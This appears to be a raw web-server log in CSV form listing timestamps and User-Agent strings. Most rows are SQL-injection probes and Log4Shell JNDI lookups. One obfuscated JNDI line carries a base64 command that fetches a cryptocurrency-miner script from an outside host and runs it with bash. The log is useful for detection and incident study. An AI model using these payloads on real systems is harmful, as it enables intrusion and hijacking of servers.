Time,User Agent
"2026-06-22 00:45:35","x' OR SLEEP(8) OR 'x"
"2026-06-16 17:31:42","x' OR SLEEP(8) OR 'x"
"2026-06-14 23:09:45","x' OR SLEEP(8) OR 'x"
"2026-06-12 22:10:19","x' OR SLEEP(8) OR 'x"
"2026-06-03 19:53:36","WebEnumerationFramework/11.0 ${jndi:ldap://127.0.0.1/a}"
"2026-06-03 19:53:23","AssetProfiler/6.5 ${jndi:ldap://127.0.0.1/a}"
"2026-06-03 18:28:35","SecurityAssessmentClient/3.1 ${jndi:ldap://127.0.0.1/a}"
"2026-06-03 10:46:36","1' OR '1'='1"
"2026-06-03 01:06:32","ReconEngine/5.4 ${jndi:ldap://127.0.0.1/a}"
"2026-06-03 01:02:22","' OR 1=1--"
"2026-06-03 01:02:19","ThreatHunterAgent/8.2 ${jndi:ldap://127.0.0.1/a}"
"2026-06-03 01:02:14","VulnerabilitySweep/2.6 ${jndi:ldap://127.0.0.1/a}"
"2026-06-01 15:32:43","${jndi:ldap://127.0.0.1/a}"
"2026-06-01 15:31:50","<<<<>>>>"
"2026-06-01 10:44:53","<<<<>>>>"
"2026-06-01 10:44:42","AssetProfiler/6.5 ${jndi:ldap://127.0.0.1/a}"
"2026-06-01 08:54:45","1' OR '1'='1"
"2026-06-01 08:54:45","' OR 1=1--"
"2026-06-01 08:54:26","DiscoveryProbe/7.3 ${jndi:ldap://127.0.0.1/a}"
"2026-06-01 08:54:26","VulnerabilitySweep/2.6 ${jndi:ldap://127.0.0.1/a}"
"2026-06-01 08:53:51","<<<<>>>>"
"2026-06-01 08:53:47","${jndi:ldap://127.0.0.1/a}"
"2026-06-01 01:19:28","${jndi:ldap://127.0.0.1/a}"
"2026-06-01 01:19:14","' OR 1=1--"
"2026-06-01 01:19:06","<<<<>>>>"
"2026-05-31 19:41:32","1' OR '1'='1"
"2026-05-31 19:41:29","VulnerabilitySweep/2.6 ${jndi:ldap://127.0.0.1/a}"
"2026-05-31 19:41:29","${jndi:ldap://127.0.0.1/a}"
"2026-05-31 19:41:27","<<<<>>>>"
"2026-05-31 17:06:29","${jndi:ldap://127.0.0.1/a}"
"2026-05-31 17:05:27","<<<<>>>>"
"2026-05-31 14:50:39","<<<<>>>>"
"2026-05-31 14:50:27","${jndi:ldap://127.0.0.1/a}"
"2026-05-31 11:20:45","1' OR '1'='1"
"2026-05-30 12:26:44","DiscoveryProbe/7.3 ${jndi:ldap://127.0.0.1/a}"
"2026-05-30 11:32:35","${jndi:ldap://127.0.0.1/a}"
"2026-05-30 11:30:54","<<<<>>>>"
"2026-05-30 11:30:50","' OR 1=1--"
"2026-05-30 11:29:43","${jndi:ldap://127.0.0.1/a}"
"2026-05-30 11:29:26","1' OR '1'='1"
"2026-05-30 11:29:22","TelemetryCollector/9.7 ${jndi:ldap://127.0.0.1/a}"
"2026-05-30 11:29:20","<<<<>>>>"
"2026-05-30 11:29:19","SecurityAssessmentClient/3.1 ${jndi:ldap://127.0.0.1/a}"
"2026-05-29 17:20:07","' OR 1=1--"
"2026-05-29 17:20:00","TelemetryCollector/9.7 ${jndi:ldap://127.0.0.1/a}"
"2026-05-29 13:45:04","' OR 1=1--"
"2026-05-29 13:40:23","' OR 1=1--"
"2026-05-29 13:39:04","' OR 1=1--"
"2026-05-29 13:30:01","' OR 1=1--"
"2026-05-29 13:26:19","' OR 1=1--"
"2026-05-29 13:20:31","' OR 1=1--"
"2026-05-29 13:16:50","' OR 1=1--"
"2026-06-01 15:31:42","""@@@@@@@"""
"2026-06-01 10:44:30","""@@@@@@@"""
"2026-06-01 01:19:03","""@@@@@@@"""
"2026-05-31 19:41:21","""@@@@@@@"""
"2026-05-31 14:51:09","""@@@@@@@"""
"2026-05-31 11:20:50","""@@@@@@@"""
"2026-05-30 11:25:42","""@@@@@@@"""
"2026-05-29 18:05:38","""@@@@@@@"""
"2026-05-29 17:20:59","""@@@@@@@"""
"2026-06-03 10:05:14","#"
"2026-06-01 15:32:22","select pg_sleep(3)"
"2026-06-01 10:44:27","select pg_sleep(3)"
"2026-06-01 01:19:11","select pg_sleep(3)"
"2026-05-31 19:41:24","select pg_sleep(3)"
"2026-05-31 17:05:22","select pg_sleep(3)"
"2026-05-31 13:16:47","#"
"2026-05-31 10:05:03","#"
"2026-05-30 12:26:26","select pg_sleep(3)"
"2026-05-30 11:30:52","select pg_sleep(3)"
"2026-05-26 11:20:15","#"
"2026-06-13 10:46:03","ThreatHunterAgent/8.2 1' OR '1'='1"
"2026-06-12 23:38:27","SecurityAssessmentClient/3.1 1' OR '1'='1"
"2026-06-12 22:09:44","DiscoveryProbe/7.3 1' OR '1'='1"
"2026-06-12 16:25:08","DiscoveryProbe/7.3 1' OR '1'='1"
"2026-06-01 15:32:41","VulnerabilitySweep/2.6 1' OR '1'='1"
"2026-06-01 10:44:29","DiscoveryProbe/7.3 1' OR '1'='1"
"2026-06-01 01:18:59","ThreatHunterAgent/8.2 1' OR '1'='1"
"2026-05-31 14:51:12","select pg_sleep(6)"
"2026-06-12 23:38:27","NetworkSurveyBot/3.9 1' OR '1'='1"
"2026-06-12 23:38:26","AssetProfiler/6.5 1' OR '1'='1"
"2026-06-12 22:09:44","ReconEngine/5.4 1' OR '1'='1"
"2026-06-12 20:19:43","NetworkSurveyBot/3.9 1' OR '1'='1"
"2026-06-03 18:28:34","waitfor delay '0:0:5'"
"2026-06-01 15:32:25","NetworkSurveyBot/3.9 1' OR '1'='1"
"2026-06-01 15:31:53","select pg_sleep(6)"
"2026-06-01 15:31:53","waitfor delay '0:0:9'"
"2026-06-01 08:54:30","waitfor delay '0:0:5'"
"2026-06-01 08:53:46","select pg_sleep(6)"
"2026-05-31 22:15:54","select pg_sleep(6)"
"2026-05-31 11:20:50","select pg_sleep(6)"
"2026-05-31 11:20:47","waitfor delay '0:0:5'"
"2026-05-30 11:29:19","ReconEngine/5.4 1' OR '1'='1"
"2026-06-02 22:35:43","ReconEngine/5.4 1' OR '1'='1"
"2026-06-01 15:32:25",""" OR 1=1--"
"2026-06-01 10:44:39",""" OR 1=1--"
"2026-06-01 08:54:28",""" OR 1=1--"
"2026-05-31 22:15:38","waitfor delay '0:0:5'"
"2026-05-31 14:50:30",""" OR 1=1--"
"2026-05-29 17:20:22",""" OR 1=1--"
"2026-05-30 11:31:45","t('${${env:NaN:-j}ndi${env:NaN:-:}${env:NaN:-l}dap${env:NaN:-:}//148.113.233.202:3306/TomcatBypass/Command/Base64/ZXhwb3J0IEhPTUU9L3RtcDsgY3VybCAtcyAtTCBodHRwOi8vMzEuNTcuMTA5LjEzMS9zY3JpcHRzLzR0aGVwb29sX21pbmVyLnNoIHwgYmFzaCAtcw==}')"
"2026-06-09 11:36:13","*BcfBAAAAAAAAAAAAAAAAAAAAahgQRn7aueKqDVwUAGivsDOAV6gBAIAAKAA="
"2026-06-09 11:32:56","*BcfBAAAAAAAAAAAAAAAAAAAAahgQRn7aueKqDVwUAGivsDOAV6gBAIAAKAA=, *BcfBAAAAAAAAAAAAAAAAAAAAahgQRn7aueKqDVwUAGivsDOAV6gBAIAAKAA="
"2026-06-09 11:29:13","*BcfBAAAAAAAAAAAAAAAAAAAAahgQRn7aueKqDVwUAGivsDOAV6gBAIAAKAA="
"2026-06-09 11:22:11","*BcfBAAAAAAAAAAAAAAAAAAAAahgQRn7aueKqDVwUAGivsDOAV6gBAIAAKAA=, *BcfBAAAAAAAAAAAAAAAAAAAAahgQRn7aueKqDVwUAGivsDOAV6gBAIAAKAA=, *BcfBAAAAAAAAAAAAAAAAAAAAahgQRn7aueKqDVwUAGivsDOAV6gBAIAAKAA=, *BcfBAAAAAAAAAAAAAAAAAAAAahgQRn7aueKqDVwUAGivsDOAV6gBAIAAKAA=, *BcfBAAAAAAAAAAAAAAAAAAAAahgQRn7aueKqDVwUAGivsDOAV6gBAIAAKAA="
"2026-06-09 11:18:36","*BcfBAAAAAAAAAAAAAAAAAAAAahgQRn7aueKqDVwUAGivsDOAV6gBAIAAKAA=, *BcfBAAAAAAAAAAAAAAAAAAAAahgQRn7aueKqDVwUAGivsDOAV6gBAIAAKAA=, *BcfBAAAAAAAAAAAAAAAAAAAAahgQRn7aueKqDVwUAGivsDOAV6gBAIAAKAA=, *BcfBAAAAAAAAAAAAAAAAAAAAahgQRn7aueKqDVwUAGivsDOAV6gBAIAAKAA=, *BcfBAAAAAAAAAAAAAAAAAAAAahgQRn7aueKqDVwUAGivsDOAV6gBAIAAKAA="
"2026-06-09 11:12:15","*BcfBAAAAAAAAAAAAAAAAAAAAahgQRn7aueKqDVwUAGivsDOAV6gBAIAAKAA=, *BcfBAAAAAAAAAAAAAAAAAAAAahgQRn7aueKqDVwUAGivsDOAV6gBAIAAKAA=, *BcfBAAAAAAAAAAAAAAAAAAAAahgQRn7aueKqDVwUAGivsDOAV6gBAIAAKAA=, *BcfBAAAAAAAAAAAAAAAAAAAAahgQRn7aueKqDVwUAGivsDOAV6gBAIAAKAA=, *BcfBAAAAAAAAAAAAAAAAAAAAahgQRn7aueKqDVwUAGivsDOAV6gBAIAAKAA="
"2026-06-09 11:06:13","*BcfBAAAAAAAAAAAAAAAAAAAAahgQRn7aueKqDVwUAGivsDOAV6gBAIAAKAA=, *BcfBAAAAAAAAAAAAAAAAAAAAahgQRn7aueKqDVwUAGivsDOAV6gBAIAAKAA=, *BcfBAAAAAAAAAAAAAAAAAAAAahgQRn7aueKqDVwUAGivsDOAV6gBAIAAKAA=, *BcfBAAAAAAAAAAAAAAAAAAAAahgQRn7aueKqDVwUAGivsDOAV6gBAIAAKAA=, *BcfBAAAAAAAAAAAAAAAAAAAAahgQRn7aueKqDVwUAGivsDOAV6gBAIAAKAA="
"2026-06-09 11:01:26","*BcfBAAAAAAAAAAAAAAAAAAAAahgQRn7aueKqDVwUAGivsDOAV6gBAIAAKAA="
"2026-06-01 08:54:27","${jndi:rmi://127.0.0.1/exploit}"
"2026-06-01 08:54:00","${jndi:dns://127.0.0.1/x}"
"2026-05-31 17:05:25","${jndi:rmi://127.0.0.1/exploit}"
"2026-05-31 14:50:42","${jndi:dns://127.0.0.1/x}"
"2026-05-31 11:20:41","${jndi:dns://127.0.0.1/x}"
"2026-05-30 11:30:53","${jndi:rmi://127.0.0.1/exploit}"
"2026-06-01 15:32:44","${jndi:rmi://127.0.0.1/exploit}"
"2026-06-01 15:31:45","${jndi:dns://127.0.0.1/x}"
"2026-06-01 10:44:29","${jndi:dns://127.0.0.1/x}"
"2026-05-31 19:41:36","${jndi:rmi://127.0.0.1/exploit}"
"2026-05-31 19:41:24","${jndi:dns://127.0.0.1/x}"
"2026-05-30 12:26:52","${jndi:dns://127.0.0.1/x}"
"2026-06-12 20:19:43","TelemetryCollector/9.7 @@@@@@@"
"2026-06-12 20:19:43","VulnerabilitySweep/2.6 @@@@@@@"
"2026-06-12 16:25:07","TelemetryCollector/9.7 @@@@@@@"
"2026-06-03 10:46:31","VulnerabilitySweep/2.6 @@@@@@@"
"2026-06-01 15:32:24","TelemetryCollector/9.7 @@@@@@@"
"2026-06-16 11:59:13","TelemetryCollector/9.7 @@@@@@@"
"2026-06-14 14:04:43","TelemetryCollector/9.7 @@@@@@@"
"2026-06-14 14:04:34","ThreatHunterAgent/8.2 @@@@@@@"
"2026-06-13 11:36:22","SecurityAssessmentClient/3.1 @@@@@@@"
"2026-06-13 11:36:21","NetworkSurveyBot/3.9 @@@@@@@"
"2026-06-12 23:38:28","TelemetryCollector/9.7 @@@@@@@"
"2026-06-12 22:09:43","SecurityAssessmentClient/3.1 @@@@@@@"
"2026-06-12 20:19:42","InternalAuditScanner/4.0 @@@@@@@"
"2026-06-12 16:25:08","SecurityAssessmentClient/3.1 @@@@@@@"
"2026-06-12 16:25:08","WebEnumerationFramework/11.0 @@@@@@@"
"2026-06-12 16:25:08","AssetProfiler/6.5 @@@@@@@"
"2026-06-09 15:36:44","*BAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAcPAAAAAAAAAAAA="
"2026-06-09 15:32:07","*BAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAcPAAAAAAAAAAAA="
"2026-06-09 15:27:23","*BAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAcPAAAAAAAAAAAA=, *BAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAcPAAAAAAAAAAAA="
"2026-06-09 15:10:11","*BcfBAAAAokCAAEFBAAAZhU2VahgQRn7aueKqDVwUAGivsPJAV6gBAIAAKAA=, *BcfBAAAAokCAAEFBAAAZhU2VahgQRn7aueKqDVwUAGivsPJAV6gBAIAAKAA=, *BcfBAAAAokCAAEFBAAAZhU2VahgQRn7aueKqDVwUAGivsPJAV6gBAIAAKAA=, *BcfBAAAAokCAAEFBAAAZhU2VahgQRn7aueKqDVwUAGivsPJAV6gBAIAAKAA=, *BcfBAAAAokCAAEFBAAAZhU2VahgQRn7aueKqDVwUAGivsPJAV6gBAIAAKAA="
"2026-06-09 15:06:12","*BcfBAAAAokCAAEFBAAAZhU2VahgQRn7aueKqDVwUAGivsPJAV6gBAIAAKAA=, *BcfBAAAAokCAAEFBAAAZhU2VahgQRn7aueKqDVwUAGivsPJAV6gBAIAAKAA=, *BcfBAAAAokCAAEFBAAAZhU2VahgQRn7aueKqDVwUAGivsPJAV6gBAIAAKAA=, *BcfBAAAAokCAAEFBAAAZhU2VahgQRn7aueKqDVwUAGivsPJAV6gBAIAAKAA=, *BcfBAAAAokCAAEFBAAAZhU2VahgQRn7aueKqDVwUAGivsPJAV6gBAIAAKAA="
"2026-06-09 15:02:31","*BcfBAAAAokCAAEFBAAAZhU2VahgQRn7aueKqDVwUAGivsPJAV6gBAIAAKAA=, *BcfBAAAAokCAAEFBAAAZhU2VahgQRn7aueKqDVwUAGivsPJAV6gBAIAAKAA=, *BcfBAAAAokCAAEFBAAAZhU2VahgQRn7aueKqDVwUAGivsPJAV6gBAIAAKAA=, *BcfBAAAAokCAAEFBAAAZhU2VahgQRn7aueKqDVwUAGivsPJAV6gBAIAAKAA=, *BcfBAAAAokCAAEFBAAAZhU2VahgQRn7aueKqDVwUAGivsPJAV6gBAIAAKAA="
"2026-06-09 14:59:04","*BcfBAAAAokCAAEFBAAAZhU2VahgQRn7aueKqDVwUAGivsPJAV6gBAIAAKAA="
"2026-06-09 14:55:11","*BAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAwBAAAAAAAAAAAA=, *BAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAwBAAAAAAAAAAAA=, *BAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAwBAAAAAAAAAAAA=, *BAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAwBAAAAAAAAAAAA=, *BAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAwBAAAAAAAAAAAA="
"2026-06-09 14:54:37","*BAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAwBAAAAAAAAAAAA=, *BAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAwBAAAAAAAAAAAA=, *BAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAwBAAAAAAAAAAAA=, *BAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAwBAAAAAAAAAAAA=, *BAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAwBAAAAAAAAAAAA="
"2026-06-09 14:47:29","*BAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAwBAAAAAAAAAAAA="
"2026-06-09 14:44:56","*BAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAwBAAAAAAAAAAAA=, *BAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAwBAAAAAAAAAAAA=, *BAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAwBAAAAAAAAAAAA=, *BAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAwBAAAAAAAAAAAA=, *BAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAwBAAAAAAAAAAAA="
"2026-06-09 14:25:31","*BcfBAAAAokCAAEFBAAAZhU2VahgQRn7aueKqDVwUAGivsHIAV6gBAIAAKAA=, *BcfBAAAAokCAAEFBAAAZhU2VahgQRn7aueKqDVwUAGivsHIAV6gBAIAAKAA="
"2026-06-09 14:23:22","*BcfBAAAAokCAAEFBAAAZhU2VahgQRn7aueKqDVwUAGivsHIAV6gBAIAAKAA="
"2026-06-09 14:19:24","*BcfBAAAAokCAAEFBAAAZhU2VahgQRn7aueKqDVwUAGivsHIAV6gBAIAAKAA="
"2026-06-09 14:10:31","*BcfBAAAAokCAAEFBAAAZhU2VahgQRn7aueKqDVwUAGivsHIAV6gBAIAAKAA=, *BcfBAAAAokCAAEFBAAAZhU2VahgQRn7aueKqDVwUAGivsHIAV6gBAIAAKAA="
"2026-06-09 14:10:03","*BAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAMLAAAAAAAAAAAA="
"2026-06-09 14:07:40","*BAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAMLAAAAAAAAAAAA=, *BAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAMLAAAAAAAAAAAA=, *BAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAMLAAAAAAAAAAAA=, *BAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAMLAAAAAAAAAAAA=, *BAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAMLAAAAAAAAAAAA="
"2026-06-09 14:02:00","*BAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAMLAAAAAAAAAAAA="
"2026-06-09 13:56:24","*BAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAMLAAAAAAAAAAAA=, *BAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAMLAAAAAAAAAAAA="
"2026-06-09 13:25:11","*BAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAcFAAAAAAAAAAAA=, *BAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAcFAAAAAAAAAAAA=, *BAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAcFAAAAAAAAAAAA=, *BAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAcFAAAAAAAAAAAA=, *BAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAcFAAAAAAAAAAAA="
"2026-06-09 13:22:06","*BAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAcFAAAAAAAAAAAA=, *BAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAcFAAAAAAAAAAAA=, *BAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAcFAAAAAAAAAAAA=, *BAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAcFAAAAAAAAAAAA=, *BAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAcFAAAAAAAAAAAA="
"2026-06-09 13:18:14","*BAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAcFAAAAAAAAAAAA=, *BAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAcFAAAAAAAAAAAA=, *BAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAcFAAAAAAAAAAAA=, *BAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAcFAAAAAAAAAAAA=, *BAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAcFAAAAAAAAAAAA="
"2026-06-09 13:13:01","*BAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAcFAAAAAAAAAAAA="
"2026-06-09 13:09:47","*BAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAcFAAAAAAAAAAAA=, *BAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAcFAAAAAAAAAAAA=, *BAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAcFAAAAAAAAAAAA=, *BAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAcFAAAAAAAAAAAA=, *BAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAcFAAAAAAAAAAAA="
"2026-06-09 12:55:53","*BcfBAAAAokCAAEFBAAAZhU2VahgQRn7aueKqDVwUAGivsXEAV6gBAIAAKAA="
